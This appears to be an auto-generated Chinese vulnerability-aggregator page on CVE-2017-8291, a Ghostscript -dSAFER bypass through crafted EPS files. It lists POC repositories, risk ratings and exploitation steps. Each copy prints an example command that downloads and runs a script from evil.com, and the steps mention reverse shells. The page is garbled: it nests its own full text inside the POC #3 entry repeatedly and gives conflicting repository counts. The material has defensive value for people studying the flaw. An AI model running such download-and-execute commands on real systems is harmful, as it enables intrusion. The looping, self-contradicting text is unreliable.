# CVE-2017-8291

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2017-8291-hkcfs_PIL-CVE-2017-8291.md](../2017/CVE-2017-8291-hkcfs_PIL-CVE-2017-8291.md)

## CVE-2017-8291-Ghostscript-远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 2017-04-26

**利用条件:** 需要目标系统运行存在漏洞的Ghostscript版本，并能够处理恶意EPS文件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞允许攻击者通过构造恶意的EPS文件，利用`.rsdparams`类型混淆和`/OutputFile (%pipe%`字符串绕过 `-dSAFER` 保护，从而执行任意命令。 

**有效性：** 根据漏洞库信息和搜索结果，该漏洞在野外已被利用，并且存在公开的Exploit-DB条目（https://www.exploit-db.com/exploits/41955/），表明该漏洞是可利用的。

**投毒风险：** 提供的代码片段是GNU GPL许可证，并非漏洞利用代码本身。因此，直接从该代码片段评估投毒风险较为困难。但是，考虑到漏洞利用涉及到上传恶意EPS文件，攻击者可能在EPS文件中嵌入恶意代码（例如，利用PostScript语言的特性）来进一步控制系统或进行其他恶意活动。因此，存在一定的投毒风险。虽然提供的license文件本身不包含恶意代码，但是下载和使用漏洞利用代码时，需要仔细检查其他相关文件，以防止引入恶意代码。

**利用方式：**
1.  攻击者构造一个包含恶意PostScript代码的EPS文件。
2.  该EPS文件利用`.rsdparams`类型混淆，绕过 `-dSAFER` 保护。
3.  恶意代码使用`/OutputFile (%pipe%`将命令注入到shell中执行，实现远程命令执行。

根据搜索结果，该漏洞利用涉及到类型混淆和管道命令注入，影响较大，因此建议及时更新Ghostscript版本。

**项目地址:** [hkcfs/PIL-CVE-2017-8291](https://github.com/hkcfs/PIL-CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)

---

## POC #2

**来源**: [CVE-2017-8291-shun1403_CVE-2017-8291.md](../2017/CVE-2017-8291-shun1403_CVE-2017-8291.md)

## CVE-2017-8291-Ghostscript远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 通过 2017-04-26 的 Ghostscript

**利用条件:** 需要目标系统安装 Ghostscript 并且处理EPS文件，通常发生在文件上传或者打印服务中

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞存在于 Artifex Ghostscript 中，允许攻击者绕过 -dSAFER 保护并执行远程命令。该漏洞利用了 .rsdparams 的类型混淆，通过在 EPS 文件中使用包含 '/OutputFile (%pipe%' 子字符串的精心构造的 .eps 文件作为 gs 程序的输入。

**有效性：** 根据漏洞库信息、搜索引擎结果和Exploit-DB链接，该漏洞是真实存在的，并且存在公开的利用代码。提供的POC代码`/tmp/d868cbd22f46c85caf5ffe83836fa19c/README.md`内容过于简单，仅仅包含CVE编号，但参考Exploit-DB（41955）可以找到完整的POC。

**投毒风险：** 提供的README.md文件本身并不包含任何恶意代码，但不能排除在实际利用场景中，攻击者会将恶意命令注入到通过`/OutputFile (%pipe%`执行的shell命令中。例如，利用该漏洞执行`wget http://evil.com/malicious.sh && chmod +x malicious.sh && ./malicious.sh`，从而下载并执行恶意脚本。因此，存在一定的投毒风险，主要体现在攻击者注入的恶意命令中，而非提供的README.md本身。因为缺乏实际的利用代码分析，这里假设存在10%的投毒风险，主要是指利用过程中可能引入的第三方恶意代码。

**利用方式：**
1.  **构造恶意的 EPS 文件：**  创建一个包含 '/OutputFile (%pipe%' 子字符串的 EPS 文件，利用 .rsdparams 类型混淆，允许执行任意命令。
2.  **利用 `gs` 命令处理 EPS 文件：**  使用 Ghostscript 的 `gs` 命令处理该 EPS 文件。
3.  **绕过 `-dSAFER` 保护：**  通过该漏洞绕过 Ghostscript 的 `-dSAFER` 保护机制。
4.  **执行远程命令：**  `/OutputFile (%pipe%`会将后面的字符串作为命令执行。
5.  **命令注入：**  攻击者可以将恶意指令注入到命令执行流程中，例如反弹shell，下载执行恶意程序。

**项目地址:** [shun1403/CVE-2017-8291](https://github.com/shun1403/CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)

---

## POC #3

**来源**: [CVE-2017-8291-shun1403_PIL-CVE-2017-8291-study.md](../2017/CVE-2017-8291-shun1403_PIL-CVE-2017-8291-study.md)

# CVE-2017-8291

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2017-8291-hkcfs_PIL-CVE-2017-8291.md](../2017/CVE-2017-8291-hkcfs_PIL-CVE-2017-8291.md)

## CVE-2017-8291-Ghostscript-远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 2017-04-26

**利用条件:** 需要目标系统运行存在漏洞的Ghostscript版本，并能够处理恶意EPS文件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞允许攻击者通过构造恶意的EPS文件，利用`.rsdparams`类型混淆和`/OutputFile (%pipe%`字符串绕过 `-dSAFER` 保护，从而执行任意命令。 

**有效性：** 根据漏洞库信息和搜索结果，该漏洞在野外已被利用，并且存在公开的Exploit-DB条目（https://www.exploit-db.com/exploits/41955/），表明该漏洞是可利用的。

**投毒风险：** 提供的代码片段是GNU GPL许可证，并非漏洞利用代码本身。因此，直接从该代码片段评估投毒风险较为困难。但是，考虑到漏洞利用涉及到上传恶意EPS文件，攻击者可能在EPS文件中嵌入恶意代码（例如，利用PostScript语言的特性）来进一步控制系统或进行其他恶意活动。因此，存在一定的投毒风险。虽然提供的license文件本身不包含恶意代码，但是下载和使用漏洞利用代码时，需要仔细检查其他相关文件，以防止引入恶意代码。

**利用方式：**
1.  攻击者构造一个包含恶意PostScript代码的EPS文件。
2.  该EPS文件利用`.rsdparams`类型混淆，绕过 `-dSAFER` 保护。
3.  恶意代码使用`/OutputFile (%pipe%`将命令注入到shell中执行，实现远程命令执行。

根据搜索结果，该漏洞利用涉及到类型混淆和管道命令注入，影响较大，因此建议及时更新Ghostscript版本。

**项目地址:** [hkcfs/PIL-CVE-2017-8291](https://github.com/hkcfs/PIL-CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)

---

## POC #2

**来源**: [CVE-2017-8291-shun1403_CVE-2017-8291.md](../2017/CVE-2017-8291-shun1403_CVE-2017-8291.md)

## CVE-2017-8291-Ghostscript远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 通过 2017-04-26 的 Ghostscript

**利用条件:** 需要目标系统安装 Ghostscript 并且处理EPS文件，通常发生在文件上传或者打印服务中

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞存在于 Artifex Ghostscript 中，允许攻击者绕过 -dSAFER 保护并执行远程命令。该漏洞利用了 .rsdparams 的类型混淆，通过在 EPS 文件中使用包含 '/OutputFile (%pipe%' 子字符串的精心构造的 .eps 文件作为 gs 程序的输入。

**有效性：** 根据漏洞库信息、搜索引擎结果和Exploit-DB链接，该漏洞是真实存在的，并且存在公开的利用代码。提供的POC代码`/tmp/d868cbd22f46c85caf5ffe83836fa19c/README.md`内容过于简单，仅仅包含CVE编号，但参考Exploit-DB（41955）可以找到完整的POC。

**投毒风险：** 提供的README.md文件本身并不包含任何恶意代码，但不能排除在实际利用场景中，攻击者会将恶意命令注入到通过`/OutputFile (%pipe%`执行的shell命令中。例如，利用该漏洞执行`wget http://evil.com/malicious.sh && chmod +x malicious.sh && ./malicious.sh`，从而下载并执行恶意脚本。因此，存在一定的投毒风险，主要体现在攻击者注入的恶意命令中，而非提供的README.md本身。因为缺乏实际的利用代码分析，这里假设存在10%的投毒风险，主要是指利用过程中可能引入的第三方恶意代码。

**利用方式：**
1.  **构造恶意的 EPS 文件：**  创建一个包含 '/OutputFile (%pipe%' 子字符串的 EPS 文件，利用 .rsdparams 类型混淆，允许执行任意命令。
2.  **利用 `gs` 命令处理 EPS 文件：**  使用 Ghostscript 的 `gs` 命令处理该 EPS 文件。
3.  **绕过 `-dSAFER` 保护：**  通过该漏洞绕过 Ghostscript 的 `-dSAFER` 保护机制。
4.  **执行远程命令：**  `/OutputFile (%pipe%`会将后面的字符串作为命令执行。
5.  **命令注入：**  攻击者可以将恶意指令注入到命令执行流程中，例如反弹shell，下载执行恶意程序。

**项目地址:** [shun1403/CVE-2017-8291](https://github.com/shun1403/CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)

---

## POC #3

**来源**: [CVE-2017-8291-shun1403_PIL-CVE-2017-8291-study.md](../2017/CVE-2017-8291-shun1403_PIL-CVE-2017-8291-study.md)

# CVE-2017-8291

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2017-8291-hkcfs_PIL-CVE-2017-8291.md](../2017/CVE-2017-8291-hkcfs_PIL-CVE-2017-8291.md)

## CVE-2017-8291-Ghostscript-远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 2017-04-26

**利用条件:** 需要目标系统运行存在漏洞的Ghostscript版本，并能够处理恶意EPS文件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞允许攻击者通过构造恶意的EPS文件，利用`.rsdparams`类型混淆和`/OutputFile (%pipe%`字符串绕过 `-dSAFER` 保护，从而执行任意命令。 

**有效性：** 根据漏洞库信息和搜索结果，该漏洞在野外已被利用，并且存在公开的Exploit-DB条目（https://www.exploit-db.com/exploits/41955/），表明该漏洞是可利用的。

**投毒风险：** 提供的代码片段是GNU GPL许可证，并非漏洞利用代码本身。因此，直接从该代码片段评估投毒风险较为困难。但是，考虑到漏洞利用涉及到上传恶意EPS文件，攻击者可能在EPS文件中嵌入恶意代码（例如，利用PostScript语言的特性）来进一步控制系统或进行其他恶意活动。因此，存在一定的投毒风险。虽然提供的license文件本身不包含恶意代码，但是下载和使用漏洞利用代码时，需要仔细检查其他相关文件，以防止引入恶意代码。

**利用方式：**
1.  攻击者构造一个包含恶意PostScript代码的EPS文件。
2.  该EPS文件利用`.rsdparams`类型混淆，绕过 `-dSAFER` 保护。
3.  恶意代码使用`/OutputFile (%pipe%`将命令注入到shell中执行，实现远程命令执行。

根据搜索结果，该漏洞利用涉及到类型混淆和管道命令注入，影响较大，因此建议及时更新Ghostscript版本。

**项目地址:** [hkcfs/PIL-CVE-2017-8291](https://github.com/hkcfs/PIL-CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)

---

## POC #2

**来源**: [CVE-2017-8291-shun1403_CVE-2017-8291.md](../2017/CVE-2017-8291-shun1403_CVE-2017-8291.md)

## CVE-2017-8291-Ghostscript远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 通过 2017-04-26 的 Ghostscript

**利用条件:** 需要目标系统安装 Ghostscript 并且处理EPS文件，通常发生在文件上传或者打印服务中

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞存在于 Artifex Ghostscript 中，允许攻击者绕过 -dSAFER 保护并执行远程命令。该漏洞利用了 .rsdparams 的类型混淆，通过在 EPS 文件中使用包含 '/OutputFile (%pipe%' 子字符串的精心构造的 .eps 文件作为 gs 程序的输入。

**有效性：** 根据漏洞库信息、搜索引擎结果和Exploit-DB链接，该漏洞是真实存在的，并且存在公开的利用代码。提供的POC代码`/tmp/d868cbd22f46c85caf5ffe83836fa19c/README.md`内容过于简单，仅仅包含CVE编号，但参考Exploit-DB（41955）可以找到完整的POC。

**投毒风险：** 提供的README.md文件本身并不包含任何恶意代码，但不能排除在实际利用场景中，攻击者会将恶意命令注入到通过`/OutputFile (%pipe%`执行的shell命令中。例如，利用该漏洞执行`wget http://evil.com/malicious.sh && chmod +x malicious.sh && ./malicious.sh`，从而下载并执行恶意脚本。因此，存在一定的投毒风险，主要体现在攻击者注入的恶意命令中，而非提供的README.md本身。因为缺乏实际的利用代码分析，这里假设存在10%的投毒风险，主要是指利用过程中可能引入的第三方恶意代码。

**利用方式：**
1.  **构造恶意的 EPS 文件：**  创建一个包含 '/OutputFile (%pipe%' 子字符串的 EPS 文件，利用 .rsdparams 类型混淆，允许执行任意命令。
2.  **利用 `gs` 命令处理 EPS 文件：**  使用 Ghostscript 的 `gs` 命令处理该 EPS 文件。
3.  **绕过 `-dSAFER` 保护：**  通过该漏洞绕过 Ghostscript 的 `-dSAFER` 保护机制。
4.  **执行远程命令：**  `/OutputFile (%pipe%`会将后面的字符串作为命令执行。
5.  **命令注入：**  攻击者可以将恶意指令注入到命令执行流程中，例如反弹shell，下载执行恶意程序。

**项目地址:** [shun1403/CVE-2017-8291](https://github.com/shun1403/CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)

---

## POC #3

**来源**: [CVE-2017-8291-shun1403_PIL-CVE-2017-8291-study.md](../2017/CVE-2017-8291-shun1403_PIL-CVE-2017-8291-study.md)

# CVE-2017-8291

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2017-8291-hkcfs_PIL-CVE-2017-8291.md](../2017/CVE-2017-8291-hkcfs_PIL-CVE-2017-8291.md)

## CVE-2017-8291-Ghostscript-远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 2017-04-26

**利用条件:** 需要目标系统运行存在漏洞的Ghostscript版本，并能够处理恶意EPS文件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞允许攻击者通过构造恶意的EPS文件，利用`.rsdparams`类型混淆和`/OutputFile (%pipe%`字符串绕过 `-dSAFER` 保护，从而执行任意命令。 

**有效性：** 根据漏洞库信息和搜索结果，该漏洞在野外已被利用，并且存在公开的Exploit-DB条目（https://www.exploit-db.com/exploits/41955/），表明该漏洞是可利用的。

**投毒风险：** 提供的代码片段是GNU GPL许可证，并非漏洞利用代码本身。因此，直接从该代码片段评估投毒风险较为困难。但是，考虑到漏洞利用涉及到上传恶意EPS文件，攻击者可能在EPS文件中嵌入恶意代码（例如，利用PostScript语言的特性）来进一步控制系统或进行其他恶意活动。因此，存在一定的投毒风险。虽然提供的license文件本身不包含恶意代码，但是下载和使用漏洞利用代码时，需要仔细检查其他相关文件，以防止引入恶意代码。

**利用方式：**
1.  攻击者构造一个包含恶意PostScript代码的EPS文件。
2.  该EPS文件利用`.rsdparams`类型混淆，绕过 `-dSAFER` 保护。
3.  恶意代码使用`/OutputFile (%pipe%`将命令注入到shell中执行，实现远程命令执行。

根据搜索结果，该漏洞利用涉及到类型混淆和管道命令注入，影响较大，因此建议及时更新Ghostscript版本。

**项目地址:** [hkcfs/PIL-CVE-2017-8291](https://github.com/hkcfs/PIL-CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)

---

## POC #2

**来源**: [CVE-2017-8291-shun1403_CVE-2017-8291.md](../2017/CVE-2017-8291-shun1403_CVE-2017-8291.md)

## CVE-2017-8291-Ghostscript远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 通过 2017-04-26 的 Ghostscript

**利用条件:** 需要目标系统安装 Ghostscript 并且处理EPS文件，通常发生在文件上传或者打印服务中

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞存在于 Artifex Ghostscript 中，允许攻击者绕过 -dSAFER 保护并执行远程命令。该漏洞利用了 .rsdparams 的类型混淆，通过在 EPS 文件中使用包含 '/OutputFile (%pipe%' 子字符串的精心构造的 .eps 文件作为 gs 程序的输入。

**有效性：** 根据漏洞库信息、搜索引擎结果和Exploit-DB链接，该漏洞是真实存在的，并且存在公开的利用代码。提供的POC代码`/tmp/d868cbd22f46c85caf5ffe83836fa19c/README.md`内容过于简单，仅仅包含CVE编号，但参考Exploit-DB（41955）可以找到完整的POC。

**投毒风险：** 提供的README.md文件本身并不包含任何恶意代码，但不能排除在实际利用场景中，攻击者会将恶意命令注入到通过`/OutputFile (%pipe%`执行的shell命令中。例如，利用该漏洞执行`wget http://evil.com/malicious.sh && chmod +x malicious.sh && ./malicious.sh`，从而下载并执行恶意脚本。因此，存在一定的投毒风险，主要体现在攻击者注入的恶意命令中，而非提供的README.md本身。因为缺乏实际的利用代码分析，这里假设存在10%的投毒风险，主要是指利用过程中可能引入的第三方恶意代码。

**利用方式：**
1.  **构造恶意的 EPS 文件：**  创建一个包含 '/OutputFile (%pipe%' 子字符串的 EPS 文件，利用 .rsdparams 类型混淆，允许执行任意命令。
2.  **利用 `gs` 命令处理 EPS 文件：**  使用 Ghostscript 的 `gs` 命令处理该 EPS 文件。
3.  **绕过 `-dSAFER` 保护：**  通过该漏洞绕过 Ghostscript 的 `-dSAFER` 保护机制。
4.  **执行远程命令：**  `/OutputFile (%pipe%`会将后面的字符串作为命令执行。
5.  **命令注入：**  攻击者可以将恶意指令注入到命令执行流程中，例如反弹shell，下载执行恶意程序。

**项目地址:** [shun1403/CVE-2017-8291](https://github.com/shun1403/CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)

---

## POC #3

**来源**: [CVE-2017-8291-shun1403_PIL-CVE-2017-8291-study.md](../2017/CVE-2017-8291-shun1403_PIL-CVE-2017-8291-study.md)

# CVE-2017-8291

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2017-8291-hkcfs_PIL-CVE-2017-8291.md](../2017/CVE-2017-8291-hkcfs_PIL-CVE-2017-8291.md)

## CVE-2017-8291-Ghostscript-远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 2017-04-26

**利用条件:** 需要目标系统运行存在漏洞的Ghostscript版本，并能够处理恶意EPS文件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞允许攻击者通过构造恶意的EPS文件，利用`.rsdparams`类型混淆和`/OutputFile (%pipe%`字符串绕过 `-dSAFER` 保护，从而执行任意命令。 

**有效性：** 根据漏洞库信息和搜索结果，该漏洞在野外已被利用，并且存在公开的Exploit-DB条目（https://www.exploit-db.com/exploits/41955/），表明该漏洞是可利用的。

**投毒风险：** 提供的代码片段是GNU GPL许可证，并非漏洞利用代码本身。因此，直接从该代码片段评估投毒风险较为困难。但是，考虑到漏洞利用涉及到上传恶意EPS文件，攻击者可能在EPS文件中嵌入恶意代码（例如，利用PostScript语言的特性）来进一步控制系统或进行其他恶意活动。因此，存在一定的投毒风险。虽然提供的license文件本身不包含恶意代码，但是下载和使用漏洞利用代码时，需要仔细检查其他相关文件，以防止引入恶意代码。

**利用方式：**
1.  攻击者构造一个包含恶意PostScript代码的EPS文件。
2.  该EPS文件利用`.rsdparams`类型混淆，绕过 `-dSAFER` 保护。
3.  恶意代码使用`/OutputFile (%pipe%`将命令注入到shell中执行，实现远程命令执行。

根据搜索结果，该漏洞利用涉及到类型混淆和管道命令注入，影响较大，因此建议及时更新Ghostscript版本。

**项目地址:** [hkcfs/PIL-CVE-2017-8291](https://github.com/hkcfs/PIL-CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)

---

## POC #2

**来源**: [CVE-2017-8291-shun1403_CVE-2017-8291.md](../2017/CVE-2017-8291-shun1403_CVE-2017-8291.md)

## CVE-2017-8291-Ghostscript远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 通过 2017-04-26 的 Ghostscript

**利用条件:** 需要目标系统安装 Ghostscript 并且处理EPS文件，通常发生在文件上传或者打印服务中

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞存在于 Artifex Ghostscript 中，允许攻击者绕过 -dSAFER 保护并执行远程命令。该漏洞利用了 .rsdparams 的类型混淆，通过在 EPS 文件中使用包含 '/OutputFile (%pipe%' 子字符串的精心构造的 .eps 文件作为 gs 程序的输入。

**有效性：** 根据漏洞库信息、搜索引擎结果和Exploit-DB链接，该漏洞是真实存在的，并且存在公开的利用代码。提供的POC代码`/tmp/d868cbd22f46c85caf5ffe83836fa19c/README.md`内容过于简单，仅仅包含CVE编号，但参考Exploit-DB（41955）可以找到完整的POC。

**投毒风险：** 提供的README.md文件本身并不包含任何恶意代码，但不能排除在实际利用场景中，攻击者会将恶意命令注入到通过`/OutputFile (%pipe%`执行的shell命令中。例如，利用该漏洞执行`wget http://evil.com/malicious.sh && chmod +x malicious.sh && ./malicious.sh`，从而下载并执行恶意脚本。因此，存在一定的投毒风险，主要体现在攻击者注入的恶意命令中，而非提供的README.md本身。因为缺乏实际的利用代码分析，这里假设存在10%的投毒风险，主要是指利用过程中可能引入的第三方恶意代码。

**利用方式：**
1.  **构造恶意的 EPS 文件：**  创建一个包含 '/OutputFile (%pipe%' 子字符串的 EPS 文件，利用 .rsdparams 类型混淆，允许执行任意命令。
2.  **利用 `gs` 命令处理 EPS 文件：**  使用 Ghostscript 的 `gs` 命令处理该 EPS 文件。
3.  **绕过 `-dSAFER` 保护：**  通过该漏洞绕过 Ghostscript 的 `-dSAFER` 保护机制。
4.  **执行远程命令：**  `/OutputFile (%pipe%`会将后面的字符串作为命令执行。
5.  **命令注入：**  攻击者可以将恶意指令注入到命令执行流程中，例如反弹shell，下载执行恶意程序。

**项目地址:** [shun1403/CVE-2017-8291](https://github.com/shun1403/CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)

---

## POC #3

**来源**: [CVE-2017-8291-shun1403_PIL-CVE-2017-8291-study.md](../2017/CVE-2017-8291-shun1403_PIL-CVE-2017-8291-study.md)

# CVE-2017-8291

> 📦 该CVE有 **2** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2017-8291-hkcfs_PIL-CVE-2017-8291.md](../2017/CVE-2017-8291-hkcfs_PIL-CVE-2017-8291.md)

## CVE-2017-8291-Ghostscript-远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 2017-04-26

**利用条件:** 需要目标系统运行存在漏洞的Ghostscript版本，并能够处理恶意EPS文件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞允许攻击者通过构造恶意的EPS文件，利用`.rsdparams`类型混淆和`/OutputFile (%pipe%`字符串绕过 `-dSAFER` 保护，从而执行任意命令。 

**有效性：** 根据漏洞库信息和搜索结果，该漏洞在野外已被利用，并且存在公开的Exploit-DB条目（https://www.exploit-db.com/exploits/41955/），表明该漏洞是可利用的。

**投毒风险：** 提供的代码片段是GNU GPL许可证，并非漏洞利用代码本身。因此，直接从该代码片段评估投毒风险较为困难。但是，考虑到漏洞利用涉及到上传恶意EPS文件，攻击者可能在EPS文件中嵌入恶意代码（例如，利用PostScript语言的特性）来进一步控制系统或进行其他恶意活动。因此，存在一定的投毒风险。虽然提供的license文件本身不包含恶意代码，但是下载和使用漏洞利用代码时，需要仔细检查其他相关文件，以防止引入恶意代码。

**利用方式：**
1.  攻击者构造一个包含恶意PostScript代码的EPS文件。
2.  该EPS文件利用`.rsdparams`类型混淆，绕过 `-dSAFER` 保护。
3.  恶意代码使用`/OutputFile (%pipe%`将命令注入到shell中执行，实现远程命令执行。

根据搜索结果，该漏洞利用涉及到类型混淆和管道命令注入，影响较大，因此建议及时更新Ghostscript版本。

**项目地址:** [hkcfs/PIL-CVE-2017-8291](https://github.com/hkcfs/PIL-CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)

---

## POC #2

**来源**: [CVE-2017-8291-shun1403_CVE-2017-8291.md](../2017/CVE-2017-8291-shun1403_CVE-2017-8291.md)

## CVE-2017-8291-Ghostscript远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 通过 2017-04-26 的 Ghostscript

**利用条件:** 需要目标系统安装 Ghostscript 并且处理EPS文件，通常发生在文件上传或者打印服务中

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞存在于 Artifex Ghostscript 中，允许攻击者绕过 -dSAFER 保护并执行远程命令。该漏洞利用了 .rsdparams 的类型混淆，通过在 EPS 文件中使用包含 '/OutputFile (%pipe%' 子字符串的精心构造的 .eps 文件作为 gs 程序的输入。

**有效性：** 根据漏洞库信息、搜索引擎结果和Exploit-DB链接，该漏洞是真实存在的，并且存在公开的利用代码。提供的POC代码`/tmp/d868cbd22f46c85caf5ffe83836fa19c/README.md`内容过于简单，仅仅包含CVE编号，但参考Exploit-DB（41955）可以找到完整的POC。

**投毒风险：** 提供的README.md文件本身并不包含任何恶意代码，但不能排除在实际利用场景中，攻击者会将恶意命令注入到通过`/OutputFile (%pipe%`执行的shell命令中。例如，利用该漏洞执行`wget http://evil.com/malicious.sh && chmod +x malicious.sh && ./malicious.sh`，从而下载并执行恶意脚本。因此，存在一定的投毒风险，主要体现在攻击者注入的恶意命令中，而非提供的README.md本身。因为缺乏实际的利用代码分析，这里假设存在10%的投毒风险，主要是指利用过程中可能引入的第三方恶意代码。

**利用方式：**
1.  **构造恶意的 EPS 文件：**  创建一个包含 '/OutputFile (%pipe%' 子字符串的 EPS 文件，利用 .rsdparams 类型混淆，允许执行任意命令。
2.  **利用 `gs` 命令处理 EPS 文件：**  使用 Ghostscript 的 `gs` 命令处理该 EPS 文件。
3.  **绕过 `-dSAFER` 保护：**  通过该漏洞绕过 Ghostscript 的 `-dSAFER` 保护机制。
4.  **执行远程命令：**  `/OutputFile (%pipe%`会将后面的字符串作为命令执行。
5.  **命令注入：**  攻击者可以将恶意指令注入到命令执行流程中，例如反弹shell，下载执行恶意程序。

**项目地址:** [shun1403/CVE-2017-8291](https://github.com/shun1403/CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)

---



---



---



---



---



---

